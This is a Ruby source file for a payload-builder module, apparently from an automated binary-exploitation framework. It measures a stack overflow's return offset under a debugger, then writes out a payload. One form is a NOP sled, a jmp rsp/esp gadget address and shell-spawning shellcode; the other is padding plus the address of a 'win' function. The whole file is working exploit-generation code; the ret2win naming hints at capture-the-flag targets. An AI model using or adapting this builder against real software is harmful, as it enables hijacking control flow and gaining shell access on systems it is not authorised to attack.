# frozen_string_literal: true

require "augure"
require "fileutils"
require "augure-profiler"

module Lictor
  # The asploit inheritance: from the decision to the actual bytes.
  # The offset is MEASURED (cyclic pattern under the debugger - not
  # guessed, not brute-forced), the return address comes from facts
  # with their provenance, and the assembly follows the selected
  # technique's family. The result is a payload file - like the
  # original's ./payload dump - trailed for the audit.
  module PayloadBuilder
    class BuildError < StandardError; end

    module_function

    # binary: the acquired local ELF copy. facts: text or Facts.
    # technique: the selected technique (drives the template).
    # Returns {path:, offset:, ret:, ret_source:, arch:, size:}.
    def build(binary:, facts:, technique:, out:, payload_file: nil)
      facts = Augure::Facts.parse(facts) if facts.is_a?(String)
      binary = File.expand_path(binary)
      # the acquired copy comes through File.binwrite (0644): the offset
      # measurement runs it under the debugger, it must be executable
      FileUtils.chmod(0o755, binary) unless File.executable?(binary)
      arch = AugureProfiler.arch(binary)
      offset = AugureProfiler::Triage.offset(binary)
      raise BuildError, "no measured offset - the return is not controlled under the debugger" unless offset

      width = (arch == :x64) ? "Q<" : "L<"
      body, ret, ret_source = assemble(facts, technique, offset, arch, width, payload_file)
      File.binwrite(out, body)
      {path: out, offset: offset, ret: ret, ret_source: ret_source, arch: arch, size: body.bytesize}
    end

    def assemble(facts, technique, offset, arch, width, payload_file)
      case technique
      when "shellcode"
        jmp = facts["gadget"]&.find { |t, _| t.start_with?("jmp_") }
        unless jmp
          raise BuildError, "no jmp rsp/esp gadget in the facts - NX-on shellcode has nothing to jump to"
        end

        sc = payload_file ? File.binread(payload_file) : AugureProfiler::Shellcode.generate(shellcode_klass(arch), :sh)
        ret = [jmp[1]].pack(width)
        body = (+"\x90" * offset).b + ret.b + sc.b
        ret_source = "gadget:#{jmp[0]}@#{jmp[1]}"
      when "ret2func", "ret2win"
        win = facts["win_symbol"]&.first
        raise BuildError, "no win_symbol fact - the winning function's address is unknown" unless win

        # The measured offset preserves the frame's natural alignment:
        # only a misaligned return needs a bare-ret gadget in between
        # (printf-family functions fault on movaps otherwise).
        align = facts["gadget"]&.find { |t, _| t == "ret_align" }
        ret = [win[1]].pack(width)
        alignment = (offset % 16 == 0 || align.nil?) ? "" : [align[1]].pack(width)
        body = (("A" * offset).b + alignment.b + ret.b)
        ret_source = "win_symbol:#{win[0]}@#{win[1]}"
      else
        raise BuildError, "no builder template for #{technique} yet - the run stays on the exploit's own logic"
      end
      [body, ret, ret_source]
    end

    def shellcode_klass(arch)
      (arch == :x64) ? Metasm::X64 : Metasm::Ia32
    end
  end
end
